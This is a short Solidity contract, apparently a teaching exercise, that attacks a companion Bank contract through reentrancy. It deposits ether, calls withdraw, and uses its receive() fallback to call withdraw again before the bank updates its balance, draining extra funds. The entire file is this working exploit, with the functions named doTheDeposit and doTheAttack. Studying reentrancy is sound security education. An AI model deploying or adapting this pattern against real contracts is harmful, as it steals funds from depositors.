pragma solidity >=0.8.0 <0.9.0;
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
//import "@openzeppelin/contracts/access/Ownable.sol";
// https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable.sol

import "./Bank.sol";

contract YourContract {

  Bank public bankContract;

  constructor(address payable bankAddress) {
    bankContract = Bank(bankAddress);
  }

  function myBalance() public view returns (uint256) {
    return bankContract.balance(address(this));
  }

  function doTheDeposit() public payable {
    bankContract.deposit{value: msg.value}();
  }

  function doTheAttack() public {
    bankContract.withdraw();
    //payable(msg.sender).transfer(address(this).balance);
  }

  bool attacked = false;

  receive() external payable {
    if(!attacked){
      attacked=true;
      bankContract.withdraw();
    }
  }

}
